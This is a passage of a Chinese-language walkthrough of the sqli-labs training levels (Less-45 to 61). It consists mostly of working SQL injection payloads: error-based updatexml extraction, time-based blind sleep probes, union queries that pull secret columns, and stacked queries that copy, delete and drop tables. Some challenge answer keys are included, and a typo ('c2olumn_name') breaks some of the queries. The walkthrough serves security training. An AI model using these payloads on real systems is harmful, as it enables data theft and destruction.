LIKE users;#</span><br><span class="hljs-string">a&#x27;</span> <span class="hljs-keyword">OR</span> <span class="hljs-number">1</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;<span class="hljs-keyword">INSERT INTO</span> WhiteMoon <span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users;#<br>a<span class="hljs-string">&#x27; OR 1 = 1;DELETE FROM WhiteMoon;#</span><br><span class="hljs-string">a&#x27;</span> <span class="hljs-keyword">OR</span> <span class="hljs-number">1</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;<span class="hljs-keyword">DROP</span> <span class="hljs-keyword">TABLE</span> WhiteMoon;#<br></code></pre></td></tr></table></figure><h4 id="Less-46-报错注入-数字型-页面不返回回显"><a href="#Less-46-报错注入-数字型-页面不返回回显" class="headerlink" title="Less-46-报错注入-数字型-页面不返回回显"></a>Less-46-报错注入-数字型-页面不返回回显</h4><p>?sort&#x3D;1</p><p>?sort&#x3D;2</p><p>?sort&#x3D;3</p><p>?sort&#x3D;4报错，存在报错注入，可以利用这个漏洞去获取其他数据</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022016298.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022016436.png"></p><p>报错注入：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs sql">?sort<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> updatexml(<span class="hljs-number">1</span>,concat(&quot;!&quot;,database()),<span class="hljs-number">2</span>)#<br><br>?sort<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> updatexml(<span class="hljs-number">1</span>,concat(&quot;!&quot;,(<span class="hljs-keyword">SELECT</span> group_concat(table_name) <span class="hljs-keyword">FROM</span> information_schema.tables <span class="hljs-keyword">WHERE</span> table_schema <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;security&#x27;</span>)),<span class="hljs-number">2</span>)#<br><br>?sort<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> updatexml(<span class="hljs-number">1</span>,concat(&quot;!&quot;,(<span class="hljs-keyword">SELECT</span> group_concat(c2olumn_name) <span class="hljs-keyword">FROM</span> information_schema.columns <span class="hljs-keyword">WHERE</span> table_schema <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">AND</span> table_name <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;emails&#x27;</span>)),<span class="hljs-number">2</span>)#<br><br>?sort<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-string">&#x27;!&#x27;</span>,(<span class="hljs-keyword">SELECT</span> concat_ws(<span class="hljs-string">&#x27;:&#x27;</span>,id,email_id) <span class="hljs-keyword">FROM</span> (<span class="hljs-keyword">SELECT</span> id,email_id <span class="hljs-keyword">FROM</span> emails)text LIMIT <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)),<span class="hljs-number">1</span>)#<br><br>?sort<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-string">&#x27;!&#x27;</span>,(<span class="hljs-keyword">SELECT</span> concat_ws(<span class="hljs-string">&#x27;:&#x27;</span>,id,email_id) <span class="hljs-keyword">FROM</span> (<span class="hljs-keyword">SELECT</span> id,email_id <span class="hljs-keyword">FROM</span> emails)text LIMIT <span class="hljs-number">1</span>,<span class="hljs-number">1</span>)),<span class="hljs-number">1</span>)#<br><br><br></code></pre></td></tr></table></figure><h4 id="Less-47-报错注入-‘-页面不返回回显"><a href="#Less-47-报错注入-‘-页面不返回回显" class="headerlink" title="Less-47-报错注入-‘-页面不返回回显"></a>Less-47-报错注入-‘-页面不返回回显</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sql">?sort<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; AND updatexml(1,concat(&quot;!&quot;,database()),2) --+</span><br><span class="hljs-string"></span><br><span class="hljs-string">?sort=1&#x27;</span> <span class="hljs-keyword">AND</span> updatexml(<span class="hljs-number">1</span>,concat(&quot;!&quot;,(<span class="hljs-keyword">SELECT</span> group_concat(table_name) <span class="hljs-keyword">FROM</span> information_schema.tables <span class="hljs-keyword">WHERE</span> table_schema <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;security&#x27;</span>)),<span class="hljs-number">2</span>) <span class="hljs-comment">--+</span><br><br>?sort<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; AND updatexml(1,concat(&quot;!&quot;,(SELECT group_concat(c2olumn_name) FROM information_schema.columns WHERE table_schema = &#x27;</span>security<span class="hljs-string">&#x27; AND table_name = &#x27;</span>emails<span class="hljs-string">&#x27;)),2) --+</span><br><span class="hljs-string"></span><br><span class="hljs-string">?sort=1&#x27;</span> <span class="hljs-keyword">AND</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-string">&#x27;!&#x27;</span>,(<span class="hljs-keyword">SELECT</span> concat_ws(<span class="hljs-string">&#x27;:&#x27;</span>,id,email_id) <span class="hljs-keyword">FROM</span> (<span class="hljs-keyword">SELECT</span> id,email_id <span class="hljs-keyword">FROM</span> emails)text LIMIT <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)),<span class="hljs-number">1</span>) <span class="hljs-comment">--+</span><br><br>?sort<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; AND updatexml(1,concat(&#x27;</span><span class="hljs-operator">!</span><span class="hljs-string">&#x27;,(SELECT concat_ws(&#x27;</span>:<span class="hljs-string">&#x27;,id,email_id) FROM (SELECT id,email_id FROM emails)text LIMIT 1,1)),1) --+</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><h4 id="Less-48-时间盲注-数字型"><a href="#Less-48-时间盲注-数字型" class="headerlink" title="Less-48-时间盲注-数字型"></a>Less-48-时间盲注-数字型</h4><p>经过测试，这一关是数字型注入，页面不返回报错信息，要使用时间盲注</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql">?sort<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> IF(LENGTH(database())<span class="hljs-operator">=</span><span class="hljs-number">8</span>,sleep(<span class="hljs-number">1</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br><br>?sort<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> IF(<span class="hljs-keyword">LEFT</span>((<span class="hljs-keyword">SELECT</span> database()), <span class="hljs-number">1</span>)<span class="hljs-operator">=</span><span class="hljs-string">&#x27;s&#x27;</span>,sleep(<span class="hljs-number">1</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br><br>?sort<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> IF(<span class="hljs-keyword">LEFT</span>((<span class="hljs-keyword">SELECT</span> database()), <span class="hljs-number">8</span>)<span class="hljs-operator">=</span><span class="hljs-string">&#x27;security&#x27;</span>,sleep(<span class="hljs-number">1</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h4 id="Less-49-时间盲注-‘"><a href="#Less-49-时间盲注-‘" class="headerlink" title="Less-49-时间盲注-‘"></a>Less-49-时间盲注-‘</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql">?sort<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; AND IF(LENGTH(database())=8,sleep(1),1)--+</span><br><span class="hljs-string"></span><br><span class="hljs-string">?sort=1&#x27;</span> <span class="hljs-keyword">AND</span> IF(<span class="hljs-keyword">LEFT</span>((<span class="hljs-keyword">SELECT</span> database()), <span class="hljs-number">1</span>)<span class="hljs-operator">=</span><span class="hljs-string">&#x27;s&#x27;</span>,sleep(<span class="hljs-number">1</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br><br>?sort<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; AND IF(LEFT((SELECT database()), 8)=&#x27;</span>security<span class="hljs-string">&#x27;,sleep(1),1)--+</span><br></code></pre></td></tr></table></figure><h4 id="Less-50-52"><a href="#Less-50-52" class="headerlink" title="Less-50,52"></a>Less-50,52</h4><p>输入正常的参数，网页回显用户名列表。对 sort 参数使用单引号闭合，网页返回错误信息。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?sort<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><p>和 Less 46 一样使用报错注入或时间注入就可以完成，此处用于测试堆叠注入。使用堆叠查询完成 Less 38 的样例。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql">?sort<span class="hljs-operator">=</span><span class="hljs-number">1</span>;<span class="hljs-keyword">CREATE TABLE</span> WhiteMoon <span class="hljs-keyword">LIKE</span> users;<span class="hljs-comment">--+</span><br>?sort<span class="hljs-operator">=</span><span class="hljs-number">1</span>;<span class="hljs-keyword">INSERT INTO</span> WhiteMoon <span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users;<span class="hljs-comment">--+</span><br>?sort<span class="hljs-operator">=</span><span class="hljs-number">1</span>;<span class="hljs-keyword">DELETE</span> <span class="hljs-keyword">FROM</span> WhiteMoon;<span class="hljs-comment">--+</span><br>?sort<span class="hljs-operator">=</span><span class="hljs-number">1</span>;<span class="hljs-keyword">DROP</span> <span class="hljs-keyword">TABLE</span> WhiteMoon;<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h4 id="Less-51-53"><a href="#Less-51-53" class="headerlink" title="Less-51,53"></a>Less-51,53</h4><p>此处存在单引号闭合的字符型注入。</p><p> Less 47 一样使用报错注入或时间注入就可以完成，此处用于测试堆叠注入。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql">?sort<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;;CREATE TABLE WhiteMoon LIKE users;--+</span><br><span class="hljs-string">?sort=1&#x27;</span>;<span class="hljs-keyword">INSERT INTO</span> WhiteMoon <span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users;<span class="hljs-comment">--+</span><br>?sort<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;;DELETE FROM WhiteMoon;--+</span><br><span class="hljs-string">?sort=1&#x27;</span>;<span class="hljs-keyword">DROP</span> <span class="hljs-keyword">TABLE</span> WhiteMoon;<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h4 id="Less-54-联合查询注入-十次限制-‘"><a href="#Less-54-联合查询注入-十次限制-‘" class="headerlink" title="Less-54-联合查询注入(十次限制)-‘"></a>Less-54-联合查询注入(十次限制)-‘</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs sql">#判断得知为字符型注入:<br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and 1=1 --+</span><br><span class="hljs-string"></span><br><span class="hljs-string">#判断字段数</span><br><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">3</span> <span class="hljs-comment">--+</span><br><br>#爆当前数据库和用户名<br>?id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-string">&#x27; union select 1,user(),database() --+</span><br><span class="hljs-string"></span><br><span class="hljs-string">#爆当前数据库下的所有表</span><br><span class="hljs-string">?id=0&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,database(),group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database() <span class="hljs-comment">--+</span><br><br>#这里的表每一次都是随机给出的<span class="hljs-operator">/</span>dtbzuzk1tk<span class="hljs-operator">/</span><br><br>#爆字段<br>?id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-string">&#x27; union select 1,database(),group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>dtbzuzk1tk<span class="hljs-string">&#x27; --+</span><br><span class="hljs-string"></span><br><span class="hljs-string">#字段也是随机/secret_S7T1/</span><br><span class="hljs-string"></span><br><span class="hljs-string">#爆数据，取/secret_****/段为过关数据</span><br><span class="hljs-string">?id=0&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,database(),group_concat(<span class="hljs-number">0x7e</span>,sessid,<span class="hljs-number">0x7e</span>,secret_S7T1) <span class="hljs-keyword">from</span> dtbzuzk1tk <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h4 id="Less-55-联合查询注入-十四次限制"><a href="#Less-55-联合查询注入-十四次限制" class="headerlink" title="Less-55-联合查询注入(十四次限制)-)"></a>Less-55-联合查询注入(十四次限制)-)</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs sql">#判断得知为字符型注入:<br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span>) <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-comment">--+</span><br><br>#判断字段数<br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span>) <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">3</span> <span class="hljs-comment">--+</span><br><br>#爆当前数据库和用户名<br>?id<span class="hljs-operator">=</span><span class="hljs-number">0</span>) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">user</span>(),database() <span class="hljs-comment">--+</span><br><br>#爆当前数据库下的所有表<br>?id<span class="hljs-operator">=</span><span class="hljs-number">0</span>) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,database(),group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database() <span class="hljs-comment">--+</span><br><br>#这里的表每一次都是随机给出的<span class="hljs-operator">/</span>k4slr3jkz6<span class="hljs-operator">/</span><br><br>#爆字段<br>?id<span class="hljs-operator">=</span><span class="hljs-number">0</span>) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,database(),group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;k4slr3jkz6&#x27;</span> <span class="hljs-comment">--+</span><br><br>#字段也是随机<span class="hljs-operator">/</span>secret_OBJS<span class="hljs-operator">/</span><br><br>#爆数据，取<span class="hljs-operator">/</span>secret_<span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">/</span>段为过关数据<br>?id<span class="hljs-operator">=</span><span class="hljs-number">0</span>) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,database(),group_concat(<span class="hljs-number">0x7e</span>,sessid,<span class="hljs-number">0x7e</span>,secret_OBJS) <span class="hljs-keyword">from</span> k4slr3jkz6 <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h4 id="Less-56-联合查询注入-十四次限制-‘）"><a href="#Less-56-联合查询注入-十四次限制-‘）" class="headerlink" title="Less-56-联合查询注入(十四次限制)-‘）"></a>Less-56-联合查询注入(十四次限制)-‘）</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs sql">#判断得知为字符型注入:<br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;) and 1=1 --+</span><br><span class="hljs-string"></span><br><span class="hljs-string">#判断字段数</span><br><span class="hljs-string">?id=1&#x27;</span>) <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">3</span> <span class="hljs-comment">--+</span><br><br>#爆当前数据库和用户名<br>?id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-string">&#x27;) union select 1,user(),database() --+</span><br><span class="hljs-string"></span><br><span class="hljs-string">#爆当前数据库下的所有表</span><br><span class="hljs-string">?id=0&#x27;</span>) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,database(),group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database() <span class="hljs-comment">--+</span><br><br>#这里的表每一次都是随机给出的<span class="hljs-operator">/</span>k4slr3jkz6<span class="hljs-operator">/</span><br><br>#爆字段<br>?id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-string">&#x27;) union select 1,database(),group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>k4slr3jkz6<span class="hljs-string">&#x27; --+</span><br><span class="hljs-string"></span><br><span class="hljs-string">#字段也是随机/secret_OBJS/</span><br><span class="hljs-string"></span><br><span class="hljs-string">#爆数据，取/secret_****/段为过关数据</span><br><span class="hljs-string">?id=0&#x27;</span>) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,database(),group_concat(<span class="hljs-number">0x7e</span>,sessid,<span class="hljs-number">0x7e</span>,secret_OBJS) <span class="hljs-keyword">from</span> k4slr3jkz6 <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h4 id="Less-57-联合查询注入-十四次限制-“"><a href="#Less-57-联合查询注入-十四次限制-“" class="headerlink" title="Less-57-联合查询注入(十四次限制)-“"></a>Less-57-联合查询注入(十四次限制)-“</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs sql">#判断得知为字符型注入:<br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span>&quot; and 1=1 --+<br><br>#判断字段数<br>?id=1&quot; <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">3</span> <span class="hljs-comment">--+</span><br><br>#爆当前数据库和用户名<br>?id<span class="hljs-operator">=</span><span class="hljs-number">0</span>&quot; union select 1,user(),database() --+<br><br>#爆当前数据库下的所有表<br>?id=0&quot; <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,database(),group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database() <span class="hljs-comment">--+</span><br><br>#这里的表每一次都是随机给出的<span class="hljs-operator">/</span><span class="hljs-number">4</span>wlhf91tdn<span class="hljs-operator">/</span><br><br>#爆字段<br>?id<span class="hljs-operator">=</span><span class="hljs-number">0</span>&quot; union select 1,database(),group_concat(column_name) from information_schema.columns where table_name=&#x27;4wlhf91tdn&#x27; --+<br><br>#字段也是随机/secret_WCBG/<br><br>#爆数据，取/secret_****/段为过关数据<br>?id=0&quot; <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,database(),group_concat(<span class="hljs-number">0x7e</span>,sessid,<span class="hljs-number">0x7e</span>,secret_WCBG) <span class="hljs-keyword">from</span> <span class="hljs-number">4</span>wlhf91tdn <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h4 id="Less-58-报错注入（五次限制）-‘"><a href="#Less-58-报错注入（五次限制）-‘" class="headerlink" title="Less-58-报错注入（五次限制）-‘"></a>Less-58-报错注入（五次限制）-‘</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs sql">#获得表名：之前已经知道数据库的名字是challenges<br><br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>CHALLENGES<span class="hljs-string">&#x27;) ),1)--+</span><br><span class="hljs-string"></span><br><span class="hljs-string">#获取字段：</span><br><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(column_name) <span class="hljs-keyword">from</span> Information_schema.columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;rropvsv2k3&#x27;</span> )),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br><br> #获取字段的值：<br> ?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and updatexml(1,concat(0x7e,(select group_concat(secret_NP44) from challenges.rropvsv2k3 )),1)--+</span><br><span class="hljs-string"> </span><br><span class="hljs-string"> mNPc5dq8hrv47LdDXgFFjiJe</span><br></code></pre></td></tr></table></figure><h4 id="Less-59-报错注入（五次限制）-数字型"><a href="#Less-59-报错注入（五次限制）-数字型" class="headerlink" title="Less-59-报错注入（五次限制）-数字型"></a>Less-59-报错注入（五次限制）-数字型</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs sql">#获得表名：<br><br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;CHALLENGES&#x27;</span>) ),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br><br>#获取字段：<br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(column_name) <span class="hljs-keyword">from</span> Information_schema.columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;jzhybgbqrz&#x27;</span> )),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br><br> #获取字段的值：<br> ?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(secret_F0VL) <span class="hljs-keyword">from</span> challenges.jzhybgbqrz )),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br> <br> V4AyD7JBzbT2AdCUcw1OlmAg<br></code></pre></td></tr></table></figure><h4 id="Less-60-报错注入（五次限制）-“"><a href="#Less-60-报错注入（五次限制）-“" class="headerlink" title="Less-60-报错注入（五次限制）-“)"></a>Less-60-报错注入（五次限制）-“)</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs sql">#获得表名：<br><br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span>&quot;) and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;CHALLENGES&#x27;) ),1)--+<br><br>#获取字段：<br>?id=1&quot;) <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(column_name) <span class="hljs-keyword">from</span> Information_schema.columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;801z2q3ff4&#x27;</span> )),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br><br> #获取字段的值：<br> ?id<span class="hljs-operator">=</span><span class="hljs-number">1</span>&quot;) and updatexml(1,concat(0x7e,(select group_concat(secret_9N7R) from challenges.801z2q3ff4 )),1)--+<br> <br> Iy2k37ZvBStuGa5Xq0b8aUGy<br><br></code></pre></td></tr></table></figure><h4 id="Less-61-报错注入（五次限制）-‘"><a href="#Less-61-报错注入（五次限制）-‘" class="headerlink" title="Less-61-报错注入（五次限制）-‘))"></a>Less-61-报错注入（五次限制）-‘))</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs sql">#获得表名：<br><br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;)) and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>CHALLENGES<span class="hljs-string">&#x27;) ),1)--+</span><br><span class="hljs-string"></span><br><span class="hljs-string">#获取字段：</span><br><span class="hljs-string">?id=1&#x27;</span>)) <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(column_name) <span class="hljs-keyword">from</span> Information_schema.columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;v9gnhvugn2&#x27;</span> )),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br><br> #获取字段的值：<br> ?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;)) and updatexml(1,concat(0x7e,(select group_concat(secret_9EHB) from challenges.v9gnhvugn2 )),1)--+</span><br><span class="hljs-string"> </span><br><span class="hljs-string"> s1DwpRlu1CKlzFP65tuY5DkN</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><h4 id="Less-62-盲注-‘"><a href="#Less-62-盲注-‘" class="headerlink" 